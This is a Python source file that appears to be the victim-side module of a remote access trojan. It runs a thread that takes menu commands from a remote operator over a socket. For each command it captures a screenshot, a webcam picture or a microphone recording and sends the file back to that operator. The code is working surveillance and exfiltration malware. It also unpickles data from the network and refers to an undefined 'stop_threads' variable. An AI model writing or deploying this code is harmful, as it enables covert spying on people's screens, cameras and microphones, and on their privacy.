import threading
import pickle
from base64 import b64encode, b64decode
import os
from datetime import datetime
from utils import take_screenshot, take_webcam_picture, record_audio
from CommunicationTarget import CommunicationTarget


class MenuHandlerTarget(threading.Thread):
	def __init__(self, connection, path):
		super(MenuHandlerTarget, self).__init__()

		self.is_running = False
		self.temp_path = path

		if isinstance(connection, CommunicationTarget):
			self.connection = connection
		else:
			raise TypeError("\'connection\' parameter should be \'CommunicationTarget\' type!")


	def stop(self):
		self.is_running = False


	def run(self):
		self.is_running = True

		while self.is_running:
			try:
				option = self.connection.socket_interact.recv()
				option = pickle.loads(option)
				option = b64decode(option).decode()
			except:
				break

			date_time = datetime.now().strftime("%d_%H_%M_%S")
			if option == '1':
				data = ["image", date_time]

				if take_screenshot(self.temp_path):
					if os.path.isfile(os.path.join(self.temp_path, "screenshot.png")):
						with open(os.path.join(self.temp_path, "screenshot.png"), 'rb') as handler:
							data.append(handler.read())
					else:
						data.append("Error")
				else:
					data.append("Error")

				try:
					data = b64encode(str(data).encode())
					data = pickle.dumps(data)
					self.connection.socket_interact.send(data)
				except:
					break
			elif option == '2':
				data = ["wcpic", date_time]

				if take_webcam_picture(self.temp_path):
					if os.path.isfile(os.path.join(self.temp_path, "wc_picture.png")):
						with open(os.path.join(self.temp_path, "wc_picture.png"), 'rb') as handler:
							data.append(handler.read())
					else:
						data.append("Error")
				else:
					data.append("Error")

				try:
					data = b64encode(str(data).encode())
					data = pickle.dumps(data)
					self.connection.socket_interact.send(data)
				except:
					break
			elif option == '3':
				data = ["audio", date_time]

				if record_audio(self.temp_path):
					if os.path.isfile(os.path.join(self.temp_path, "rec_audio.wav")):
						with open(os.path.join(self.temp_path, "rec_audio.wav"), 'rb') as handler:
							data.append(handler.read())
					else:
						data.append("Error")
				else:
					data.append("Error")

				try:
					data = b64encode(str(data).encode())
					data = pickle.dumps(data)
					self.connection.socket_interact.send(data)
				except:
					break
			elif option == '4' or stop_threads:
				data = ["close", date_time, "Exit"]
				data = b64encode(str(data).encode())
				data = pickle.dumps(data)
				self.connection.socket_stream.send(data)
				self.connection.socket_stream.close()
				self.connection.socket_interact.close()
				break